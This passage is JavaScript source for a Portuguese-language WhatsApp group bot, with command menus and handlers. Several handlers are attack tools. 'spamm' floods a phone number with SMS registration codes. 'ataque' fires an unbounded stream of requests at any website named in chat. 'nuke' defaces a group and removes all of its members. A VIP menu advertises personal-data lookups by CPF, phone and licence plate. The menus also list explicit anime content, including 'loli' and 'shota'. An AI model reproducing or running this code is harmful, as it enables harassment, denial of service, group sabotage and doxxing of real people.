┃❐𖥨 ${prefix}banf  
┃❐𖥨 ${prefix}limpar  
┃❐𖥨 ${prefix}roletarussa  
┃❐𖥨 ${prefix}nomegp  
┃❐𖥨 ${prefix}descgp  
┃❐𖥨 ${prefix}idgp  
┃❐𖥨 ${prefix}status  
┃❐𖥨 ${prefix}linkgp  
┃❐𖥨 ${prefix}rmfotogp  
┃❐𖥨 ${prefix}fotogp  
┃❐𖥨 ${prefix}marcar  
┃❐𖥨 ${prefix}totag  
┃❐𖥨 ${prefix}marcarwa  
┃❐𖥨 ${prefix}mute  
┃❐𖥨 ${prefix}desmute  
┃❐𖥨 ${prefix}advertir  
┃❐𖥨 ${prefix}rmadv  
┃❐𖥨 ${prefix}promover  
┃❐𖥨 ${prefix}rebaixar  
┃❐𖥨 ${prefix}delete  
┃❐𖥨 ${prefix}grupo [a/f]  
┃❐𖥨 ${prefix}resetarlink  
┃❐𖥨 ${prefix}sorteio  
┃❐𖥨 ${prefix}recrutar  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
         𝐀𝐓𝐈𝐕𝐀ÇÕ𝐄𝐒 𝐆𝐑𝐔𝐏𝐎  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}x9visuunica [1/0]  
┃❐𖥨 ${prefix}modogame [1/0]  
┃❐𖥨 ${prefix}bem-vindo [1/0]  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menudono': case 'Menudono':
reagir(from,`💖`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
         𝐌𝐄𝐍𝐔 𝐃𝐎𝐍𝐎/𝐂𝐎𝐍𝐅𝐈𝐆  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}rmv-perfil  
┃❐𖥨 ${prefix}nome-perfil  
┃❐𖥨 ${prefix}recado  
┃❐𖥨 ${prefix}perfil-bot  
┃❐𖥨 ${prefix}reiniciar  
┃❐𖥨 ${prefix}index-bot  
┃❐𖥨 ${prefix}getcase  
┃❐𖥨 ${prefix}get  
┃❐𖥨 ${prefix}apagar  
┃❐𖥨 ${prefix}entrar  
┃❐𖥨 ${prefix}cases  
┃❐𖥨 ${prefix}nuke  
┃❐𖥨 ${prefix}listagp  
┃❐𖥨 ${prefix}sairdogp  
┃❐𖥨 ${prefix}listavip  
┃❐𖥨 ${prefix}delvip  
┃❐𖥨 ${prefix}addvip  
┃❐𖥨 ${prefix}servip  
┃❐𖥨 ${prefix}unbangp  
┃❐𖥨 ${prefix}bangp  
┃❐𖥨 ${prefix}sermembro  
┃❐𖥨 ${prefix}seradm  
┃❐𖥨 ${prefix}prefixo-bot  
┃❐𖥨 ${prefix}addkey  
┃❐𖥨 ${prefix}delkey  
┃❐𖥨 ${prefix}key  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menuvip': case 'Menuvip':
reagir(from,`💖`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
            𝐌𝐄𝐍𝐔 𝐏𝐔𝐗𝐀𝐃𝐀𝐒  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}nome  
┃❐𖥨 ${prefix}cpf  
┃❐𖥨 ${prefix}telefone  
┃❐𖥨 ${prefix}cep  
┃❐𖥨 ${prefix}cnpj  
┃❐𖥨 ${prefix}placa  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menuanime': case 'Menuanime':
reagir(from,`💖`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
            𝐀𝐍𝐈𝐌𝐄𝐒 +𝟏𝟖  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}hentai-vid  
┃❐𖥨 ${prefix}hentai-gay  
┃❐𖥨 ${prefix}lesbian  
┃❐𖥨 ${prefix}ass  
┃❐𖥨 ${prefix}bdms  
┃❐𖥨 ${prefix}blowjob  
┃❐𖥨 ${prefix}cuckold  
┃❐𖥨 ${prefix}cum  
┃❐𖥨 ${prefix}ero  
┃❐𖥨 ${prefix}femdom  
┃❐𖥨 ${prefix}foot  
┃❐𖥨 ${prefix}gankbang  
┃❐𖥨 ${prefix}glasses  
┃❐𖥨 ${prefix}hentai  
┃❐𖥨 ${prefix}jahy  
┃❐𖥨 ${prefix}manga  
┃❐𖥨 ${prefix}neko  
┃❐𖥨 ${prefix}orgy  
┃❐𖥨 ${prefix}panties  
┃❐𖥨 ${prefix}pussy  
┃❐𖥨 ${prefix}neko2  
┃❐𖥨 ${prefix}tentacles  
┃❐𖥨 ${prefix}thighs  
┃❐𖥨 ${prefix}yuri  
┃❐𖥨 ${prefix}zettai  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
      𝐀𝐍𝐈𝐌𝐄𝐒/𝐈𝐌𝐀𝐆𝐄𝐍𝐒  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}toukachan  
┃❐𖥨 ${prefix}megumin  
┃❐𖥨 ${prefix}keneki  
┃❐𖥨 ${prefix}onepiece  
┃❐𖥨 ${prefix}tsunade  
┃❐𖥨 ${prefix}sasuke  
┃❐𖥨 ${prefix}sakura  
┃❐𖥨 ${prefix}madara  
┃❐𖥨 ${prefix}itachi  
┃❐𖥨 ${prefix}inori  
┃❐𖥨 ${prefix}hestia  
┃❐𖥨 ${prefix}chitoge  
┃❐𖥨 ${prefix}emilia  
┃❐𖥨 ${prefix}avusawa  
┃❐𖥨 ${prefix}asuna  
┃❐𖥨 ${prefix}deidara  
┃❐𖥨 ${prefix}anna  
┃❐𖥨 ${prefix}rize  
┃❐𖥨 ${prefix}nezuko  
┃❐𖥨 ${prefix}sagari  
┃❐𖥨 ${prefix}minato  
┃❐𖥨 ${prefix}naruto  
┃❐𖥨 ${prefix}hinata  
┃❐𖥨 ${prefix}elaina  
┃❐𖥨 ${prefix}erza  
┃❐𖥨 ${prefix}eba  
┃❐𖥨 ${prefix}shinka  
┃❐𖥨 ${prefix}kagura  
┃❐𖥨 ${prefix}shina  
┃❐𖥨 ${prefix}isuku  
┃❐𖥨 ${prefix}gremory  
┃❐𖥨 ${prefix}akiyama  
┃❐𖥨 ${prefix}mikasa  
┃❐𖥨 ${prefix}kotori  
┃❐𖥨 ${prefix}kaga  
┃❐𖥨 ${prefix}shizuka  
┃❐𖥨 ${prefix}kaori  
┃❐𖥨 ${prefix}boruto  
┃❐𖥨 ${prefix}chiho  
┃❐𖥨 ${prefix}tejina  
┃❐𖥨 ${prefix}yumeko  
┃❐𖥨 ${prefix}shinomiya  
┃❐𖥨 ${prefix}yotsuba  
┃❐𖥨 ${prefix}shota  
┃❐𖥨 ${prefix}loli  
┃❐𖥨 ${prefix}waifu  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
         𝐄𝐃𝐈𝐓𝐒/𝐕Í𝐃𝐄𝐎𝐒  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}edit-aleatorios  
┃❐𖥨 ${prefix}edit-bleach  
┃❐𖥨 ${prefix}edit-chain  
┃❐𖥨 ${prefix}edit-slayer  
┃❐𖥨 ${prefix}edit-dragon  
┃❐𖥨 ${prefix}edit-hunters  
┃❐𖥨 ${prefix}edit-kaisen  
┃❐𖥨 ${prefix}edit-naruto  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 


case 'spamm':
if(!isCreator) return reply(msg.dono)
  if (!q) return reply('*digite o número sem o  +55 , Exemplo  96991093456*');
reply("*aguarde um momento, estou dando spam sms no número..*.")
  const numi2 = from.replace('55', '');
  const numi = numi2.replace('@s.whatsapp.net', '');

  // Função para solicitar código SMS e tentar aumentar o código
  async function requestSMSAndIncreaseCode(phoneNumber) {
    const maxCode = -1;
    let code = 0;

    while (code !== maxCode) {
      try {
        const cu1 = await amy.requestRegistrationCode({
          phoneNumber: `+55${phoneNumber}`,
          phoneNumberCountryCode: '55',
          phoneNumberNationalNumber: phoneNumber,
          phoneNumberMobileCountryCode: 724,
          method: 'sms'
        });

        // Sua lógica para verificar a resposta cu1 e aumentar o código
        // Por exemplo, verifique se cu1 é válido e aumente o código
        if (cu1 && cu1.someCondition) {
          code++; // Aumenta o código
        }
      } catch (error) {
        console.log("*Erro ao solicitar código SMS*:", error);
      }
    }

    // O código chegou a -1
    await reply("*Código SMS atingiu -1*.");
  }

  // Chame a função para solicitar o código SMS e aumentá-lo
  requestSMSAndIncreaseCode(q);
  break
    
    
    
case 'index-bot': case 'index':
if(!isCreator) return reply(msg.dono)
if(isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
const doc = await getFileBuffer(media, 'document')
fs.writeFileSync('./index.js', doc)
amy.sendMessage(from, {text: "O arquivo './index.js' foi atualizado com sucesso."},{quoted: info})
} else {
reply('Marque o documento ou o arquivo que deseja reply pra determinar pasta ou substituir..')
}
break


case 'ataque':
if(!q) return reply(" coloque o url do site alvo para o ataque")
await reply("iniciando ataque ao site destinado")
async function fetchMultipleRequests() {
const URL = `${q}`; 
const REQUESTS_PER_SECOND = 1;
const TOTAL_REQUESTS = 25000000000000000;
let completedRequests = 0;
while (completedRequests < TOTAL_REQUESTS) {
const batch = []; 
for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
if (completedRequests >= TOTAL_REQUESTS) break;
batch.push(
fetch(URL, {
method: "GET",
headers: {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
"Accept": "application/json"
}
})
.then((response) => {
if (response.ok) {
return response.json();
} else {
console.log(`Erro: ${response.status}`);
return null;
}
})
.then((data) => {
if (data) console.log(`Sucesso:`, data);
})
.catch((error) => console.log(`Erro: ${error.message}`))
);

completedRequests++;
}
await Promise.all(batch);
await new Promise((resolve) => setTimeout(resolve, 1000));
}

console.log("Todas as solicitações foram concluídas.");
}
fetchMultipleRequests();
break;


case 'getcase':
case 'puxarcase':
try{
if(!isCreator) return reply(msg.dono)
reply('Seu perdido é uma ordem! Aguarde um pouco mestre! <3')
const getCase = (cases) => {
return 'case '+`'${cases}'`+fs.readFileSync("./index.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
await sleep(500)
msgSemQuoted(`${getCase(q)}`)
} catch(e) {
reply('A case não foi encontrada, você deve ter escrito errado...')
}
break

    
case 'get':
case 'criarcmd':
case 'novocomando':
case 'criarcomando':
case 'gerar'://tokyo
if (!isCreator) return reply(msg.dono)
reagir(from,"😇")
await sleep(3000)
const cityName = 'novacase'; //nome q tu quer q fique o nome da case enviada
const quotedMessage = info.message.extendedTextMessage.contextInfo.quotedMessage;
let messageContent = '';
let messageType = '';
let caseStructure = '';
if (quotedMessage.imageMessage) {
messageType = 'image';
messageContent = {
image: {
url: quotedMessage.imageMessage.url,
mimetype: quotedMessage.imageMessage.mimetype,
caption: quotedMessage.imageMessage.caption,
height: quotedMessage.imageMessage.height,
width: quotedMessage.imageMessage.width
}
};
caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.stickerMessage) {
messageType = 'sticker';
messageContent = {
sticker: {
url: quotedMessage.stickerMessage.url,
fileEncSha256: quotedMessage.stickerMessage.fileEncSha256,
mediaKey: quotedMessage.stickerMessage.mediaKey,
mimetype: quotedMessage.stickerMessage.mimetype,
directPath: quotedMessage.stickerMessage.directPath,
fileLength: quotedMessage.stickerMessage.fileLength,
mediaKeyTimestamp: quotedMessage.stickerMessage.mediaKeyTimestamp,
isAnimated: quotedMessage.stickerMessage.isAnimated,
stickerSentTs: quotedMessage.stickerMessage.stickerSentTs,
isAvatar: quotedMessage.stickerMessage.isAvatar
}
};

caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.interactiveMessage) {
    messageType = 'interactive';
    const interactiveMessage = quotedMessage.interactiveMessage;
const buttons = interactiveMessage.nativeFlowMessage && interactiveMessage.nativeFlowMessage.buttons ? interactiveMessage.nativeFlowMessage.buttons : [];
    
    // Verifica se o campo 'text' está presente no interactiveMessage
    const text = interactiveMessage.body && interactiveMessage.body.text ? interactiveMessage.body.text : "";

    // Verifica se o campo 'footer' está presente no interactiveMessage
    const footer = interactiveMessage.footer && interactiveMessage.footer.text ? interactiveMessage.footer.text : "";

    caseStructure = `case '${cityName}': {\n` +
    `amy.relayMessage(from, {\n` +
    `interactiveMessage: {\n` +
    `body: {"text": "${text}"\n},\n` +
    `footer: {"text": "${footer}"\n},\n` +
    `nativeFlowMessage: {\n` +
    `buttons: [\n` +
    `${buttons.map(button => (
    `{\n` +
    `name: "${button.name}",\n` +
    `buttonParamsJson: ${JSON.stringify(button.buttonParamsJson)}\n` +
    `}\n`
    )).join(',\n')}` +
    `],\n` +
    `messageParamsJson: ""\n` +
    `}\n` +
    `}\n` +
    `}, { quoted: info });\n` +
    `break;\n` +
    `}\n`;
}  else if (quotedMessage.conversation) {
messageType = 'text';
messageContent = {
text: quotedMessage.conversation
};
caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.requestPaymentMessage) {
messageType = 'requestPayment';
caseStructure = `case '${cityName}': {\n` +
`const paymentDetails = {\n` +
`requestPaymentMessage: {\n` +
`currencyCodeIso4217: "${quotedMessage.requestPaymentMessage.currencyCodeIso4217}",\n` +
`amount1000: "${quotedMessage.requestPaymentMessage.amount1000}",\n` +
`noteMessage: {\n` +
`extendedTextMessage: {\n` +
`text: "${quotedMessage.requestPaymentMessage.noteMessage.extendedTextMessage.text}",\n` +
`contextInfo: {\n` +
`mentionedJid: [sender]\n` +
`}\n` +
`}\n` +
`},\n` +
`amount: {\n` +
`value: "${quotedMessage.requestPaymentMessage.amount.value}",\n` +
`offset: ${quotedMessage.requestPaymentMessage.amount.offset},\n` +
`currencyCode: "${quotedMessage.requestPaymentMessage.amount.currencyCode}"\n` +
`}\n` +
`}\n` +
`};\n` +
`const relayMessage = {\n` +
`key: {\n` +
`fromMe: false,\n` +
`remoteJid: from\n` +
`},\n` +
`message: paymentDetails\n` +
`};\n` +
`await amy.relayMessage(from, relayMessage.message, { messageId: relayMessage.key.id });\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.liveLocationMessage) {
messageType = 'liveLocationMessage';
const liveLocationMessage = quotedMessage.liveLocationMessage;
const degressLatitude = liveLocationMessage.degreesLatitude;
const degressLongitude = liveLocationMessage.degreesLongitude;
const caption = liveLocationMessage.caption;

messageContent = {
liveLocationMessage: {
degressLatitude,
degressLongitude,
caption
}
};
caseStructure = `case '${cityName}': {\n` +
`amy.relayMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;



} else if (quotedMessage.audioMessage) {
messageType = 'audioMessage';
const audioMessage = quotedMessage.audioMessage;
const url = audioMessage.url
const mimetype = audioMessage.mimetype
const fileSha256 = audioMessage.fileSha256
const fileLength = audioMessage.fileLength
const seconds = audioMessage.seconds
const ptt = audioMessage.ptt
messageContent = {
audio: {
url,
mimetype,
seconds,
ptt
}
};

caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;
} else {
messageType = 'text';
messageContent = {
text: quotedMessage.extendedTextMessage.text
};
caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;
}
reply(caseStructure)
break;
//╸╸╸╸╸╸╸╸╸𝘾𝙊𝙈𝘼𝙉𝘿𝙊𝙎 𝘿𝙊𝙉𝙊 ╸╸╸╸╸╸╸╸case 'nuk
case 'prefixo-bot': case 'setprefix':
setTimeout(() => {reagir(from, `😈`)}, 100)
if(args.length < 1) return reply('Informe o novo prefix do bot.')
if (!isCreator) return reply(msg.dono)
global.prefix = q
fs.writeFileSync('./donos.js', JSON.stringify(null, 2))
reply(`Prefix foi alterado com sucesso \nNovo prefix :「 ${prefix} 」`)
break

case 'perfil-bot'://Meliodasde novo xoxo tão
reagir(from, "🧪") 
await sleep(500)
if (!isCreator) return reply(msg.dono)
if (!isQuotedImage) return reply(`Marque a nova foto para ser adicionada ao meu perfil.`)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
await amy.updateProfilePicture(numeroBot, buff)
reply('A nova foto foi adicionada ao meu perfil com sucesso')
break        

case 'rmv-perfil'://Meliodasde novo xoxo tão
reagir(from, "💔") 
await sleep(500)
if (!isCreator) return reply(msg.dono)
await amy.removeProfilePicture(numeroBot)
reply('Perfil removido com sucesso :(')
break        


case 'recado':
reagir(from,"✏️")
await sleep(500)
if (!isCreator) return reply(msg.dono)
if(q.length < 1) return reply('Digite algo para ser adicionado ao meu recado.')
if (!q) return reply(` `);
await amy.sendPresenceUpdate("available")
await amy.updateProfileStatus(`${q}`)
reply('Foi adicionado um novo recado ao meu perfil')
break;

case 'nome-perfil'://by Meliodas pauzudo 
reagir(from, "✏️")
await sleep(500)
if (!isCreator) return reply(msg.dono)
if(q.length < 1) return reply('Digite um novo nome para ser adicionado ao meu perfil.')
if (!q) return reply(` `);
await amy.sendPresenceUpdate("available")
await amy.updateProfileName(`${q}`)
reply('Foi adicionado um novo nome ao meu perfil')
break;


case 'bangp':
case 'unbangp':
if(!isGroup) return reply(reply.msg.grupo)
if (!isCreator) return reply(msg.dono)
if(command == 'bangp'){
setTimeout(() => {reagir(from, `🔒`)}, 50)
if(isBanchat) return reply(`Este grupo ja esta banido`)
dataGp[0].bangp = true
setGp(dataGp)
setTimeout(() => {reagir(from, `🔐`)}, 50)
reply(`Grupo banido com sucesso`)
} else {
if(!isBanchat) return reply(`Este grupo nao esta mais banido.`)
dataGp[0].bangp = false
setGp(dataGp)
setTimeout(() => {reagir(from, `🔓`)}, 50)
reply(`Grupo desbanido com sucesso.`)
}
break

case 'nuke':
reagir( from, "💀")
if (!isCreator) return reply(msg.dono)
await sleep(600)
amy.updateProfilePicture(from, {url: "https://telegra.ph/file/ac3fec5196196ef95c74b.jpg"})
await sleep(2000)
amy.groupUpdateSubject(from, `🤡 ADM_CRICIAN ARQUIVOU🤡`) 
await sleep(3000)
amy.groupUpdateDescription(from, `LEVOU GERAL KKKK
*[ 🤡 ]*`)  
blup = []
for (let i of groupMembers) {
if(i.id !== donoNumber) blup.push(i.id)
}                      
array_fake = [];
for (let a of groupMembers) {
if (a.id !== numeroBot) {
array_fake.push(a.id);
}
}
if (array_fake.length === 0) return reply("kkkkkkk");
for (let a of array_fake) {
await sleep(4000);
amy.groupParticipantsUpdate(from, [a], 'remove');
}
teks = `ADM 𝘓𝘌𝘝𝘖𝘜 𝘎𝘌𝘙𝘈𝘓, 𝘌𝘚𝘗𝘌𝘙𝘖 𝘘𝘜𝘌 𝘛𝘌𝘕𝘏𝘈𝘔 𝘎𝘖𝘚𝘛𝘈𝘋𝘖 𝘋𝘈 𝘚𝘜𝘙𝘗𝘙𝘌𝘚𝘈 😏`;
amy.sendMessage(from, {
text: teks, mentions: array_fake
});
break;    
    
case 'cases':
if(!isCreator) return reply('Somente meu dono pode usar')
try {
const listCases = () => {
const fileContent = fs.readFileSync("index.js").toString();
const caseNames = fileContent.match(/case\s+'(.+?)'/g);
if (caseNames) {
return `_*Tᴏᴛᴀʟ ᴅᴇ Cᴀsᴇs:* ${caseNames.length} ᴄᴏᴍᴀɴᴅᴏs_`;
} else {
return "_Nᴇɴʜᴜᴍᴀ ᴄᴀsᴇ ᴇɴᴄᴏɴᴛʀᴀᴅᴀ_";
}
}
amy.sendMessage(from, { text: listCases() }, { quoted: info });
} catch (e) {
console.log(e);
reply('_Eʀʀᴏ ᴀᴏ ᴏʙᴛᴇʀ ᴀs ᴄᴀsᴇs_');
}
break

case 'ping': {
amy.sendMessage(from, { react: { text: `🏃🏻‍♀️`, key: info.key }})
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
amy.sendMessage(from, {text: 
`> PING: ${String(r.toFixed(3))}
> ONLINE: ${kyun(uptime)}
> RAM: ${(infoSystem.totalmem()/Math.pow(1024, 3)).toFixed(2)}GB
`}, {quoted: info})
}
break


case 'seradm':
reagir(from,"🤖") 
if (!isCreator) return reply(msg.dono)
mentions(`@${sender.split("@")[0]} O senhor ganhou o cargo de administrador`, [sender], true)
amy.groupParticipantsUpdate(from, [sender], "promote")
break

case 'sermembro':
reagir(from, "🤖" )
if (!isCreator) return reply(msg.dono)
mentions(`@${sender.split("@")[0]} Agora o senhor foi rebaixado para membro comum.`, [sender], true)
amy.groupParticipantsUpdate(from, [sender], "demote")
break

case 'sairdogp':
reagir(from, "🤖") 
if (!isCreator) return reply(msg.dono)
if(!q) return reply(`voce deve visualizar qual grupo eu devo sair, para isso utilize ${prefix}listagp.`)
var getGroups = await amy.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
try {
amy.sendMessage(ingfoo[q].id, {text: "estou saindo do grupo, por ordens do meu dono. "}) 
setTimeout(() => {
amy.groupLeave(ingfoo[q].id)
}, 4000)
} catch(erro) {
reply(String(erro))
}
reply("pronto! acabei de sair do grupo desejado.")
break

case 'listagp':
reagir(from, "🤖") 
if (!isCreator) return reply(msg.dono)
var getGroups = await amy.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
zeru1 = `LISTA DE GRUPOS \n*Total de Grupos:* ${ingfoo.length}\n-\n`
for (let i = 0; i < ingfoo.length; i++){
var metadt = await amy.groupMetadata(ingfoo[i].id) 
try {
var linkdogp = await amy.groupInviteCode(ingfoo[i].id)
} catch {
var linkdogp = "Não foi possível puxar o link."
}
zeru1 += `[ ${i} ] - GRUPO: ${ingfoo[i].subject}\nID: ${ingfoo[i].id}\nCRIADOR: ${metadt.subjectOwner}\nCRIADO EM: ${moment(`${ingfoo[i].creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\nPARTICIPANTES: ${ingfoo[i].participants.length}\n-\n`
}
reply(zeru1)
break

case 'dono1':
setTimeout(() => {reagir(from, `💥`)}, 100)
if(args.length < 1) return
if (!isCreator) return reply(msg.dono)
nescessario.dono1 = q.trim()
dono1 = nescessario.dono1
setNes(nescessario)
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${q}`)
break

case 'addcase':
	if(!q) return reply("Está faltando nada não??");
	if(!isCreator) return reply('so pode ser utilizado pelo meu dono');
	const pula = [fs.readFileSync('index.js', 'utf8').slice(0, fs.readFileSync('index.js', 'utf8').lastIndexOf('break') + 5), q, fs.readFileSync('index.js', 'utf8').slice(fs.readFileSync('index.js', 'utf8').lastIndexOf('break') + 5)].join('\n\n\n');
	fs.writeFileSync('index.js', pula);
	reply('Nova case adicionada com sucesso!');
	break;
	
case 'onlines':  
if (!isGroup) return reply(reply.msg.grupo)
if (!isCreator && !isGroupAdmins) return reply(" so pode ser usado por um adm")
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[ido]), amy.user.id]
amy.sendMessage(from, {text: 'Pessoas online do gp:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`}, {quoted: info})
break

case 'reiniciar':
if (!isCreator) return reply(msg.dono)
amy.sendMessage(from,{text: `Reiniciando aguarde um momento ..`}, {quoted: info})
setTimeout(() => {process.exit(0)}, 3000)
break

case 'serprem': case 'servip':
if (!isCreator) return reply(msg.dono)
premium.push(`${donoNumber}@s.whatsapp.net`)
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
reply(`Pronto ${donoNumber} você foi adicionado na lista premium.`)
break

case 'reviverqr':
if (!isCreator) return
exec(`cd ${folderUserAuth} && rm -rf pre-key* sender* session*`)
setTimeout(async () => {
reply("Reiniciando..")
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break
case 'addpremium': case 'addvip':
if (!isCreator) amy.sendMessage(from, ndono2, sticker)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.push(`${mentioned}`)
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
susp = `👑@${mentioned[0].split('@')[0]} foi adicionado à lista de usuários premium com sucesso👑`
mentions(`${susp}`, mentioned, true)   
break 


case 'delpremium': case 'delvip':
if (!isGroup) return reply(msg.grupo)
if (!isCreator) return  reply(msg.dono)
if (!budy.includes("@55")) {
num = info.message.extendedTextMessage.contextInfo.participant
bla = premium.includes(num)
if(!bla) return reply("_Este número não está incluso na lista premium.._")  
pesquisar = num
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
amy.sendMessage(from, {text: ` ${num.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
} else {
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(!bla) return reply("_Este número não está incluso na lista premium.._")  
pesquisar = mentioned
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
amy.sendMessage(from, {text: ` @${mentioned.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
}
break

case 'listavip': case 'listaprem':
if(!isCreator) return reply(msg.dono)   
if(!isPremium) return reply(msg.premium)   
tkks = '╭╸╸╸「 _PREMIUM USER👑_ 」╸╮\n'
for (let V of premium) {
tkks += `┃${prefix}+  @${V.split('@')[0]}\n`
}
tkks += `┃${prefix}+ Total : ${premium.length}\n╰╸╸╸「 _${botName}_ 」╸╯`
reply(tkks.trim())
break


//╸╸╸╸╸╸╸╸╸╸𝙈𝙀𝙉𝙐 𝙄𝙈𝘼𝙂𝙀𝙉𝙎╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸




case 'imagens':
case 'foto':
case 'fotos': {
reagir(from, "👻")
await sleep(600)
reply(`𝗘𝘀𝘁𝗼𝘂  𝗽𝗿𝗼𝗰𝘂𝗿𝗮𝗻𝗱𝗼 𝘂𝗺𝗮 𝗶𝗺𝗮𝗴𝗲𝗺 𝗽𝗮𝗿𝗮 𝘀𝗲𝘂 𝗽𝗲𝗿𝗳𝗶𝗹 👻`);
const imagensData = fs.readFileSync('./IMAGENS/imagens.js');
const jsonData = JSON.parse(imagensData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗮 𝘀𝘂𝗮 𝗶𝗺𝗮𝗴𝗲𝗺 𝗽𝗮𝗿𝗮 𝘀𝘂𝗮 𝗳𝗼𝘁𝗼 𝗱𝗲 𝗽𝗲𝗿𝗳𝗶𝗹 👻` }, { quoted: info });
}
break;

case 'presente':
case 'presentinho': {
reagir(from, "💌")
await sleep(600)
reply(`𝗼𝗶𝗲𝗵 ${pushname} 𝘀𝗲𝘂 𝗽𝗿𝗲𝘀𝗲𝗻𝘁𝗶𝗻𝗵𝗼 𝗲𝘀𝘁𝗮 𝘀𝗲𝗻𝗱𝗼 𝗲𝗻𝘃𝗶𝗮𝗱𝗼 𝗻𝗼 𝗽𝘃, 𝘃𝗮𝗺𝗼𝘀 𝘃𝗲𝗿 𝘀𝗲 𝘃𝗼𝗰𝗲 𝘁𝗲𝗺 𝘀𝗼𝗿𝘁𝗲 🌚`);
const presenteData = fs.readFileSync('./IMAGENS/presentinho.js');
const jsonData = JSON.parse(presenteData);
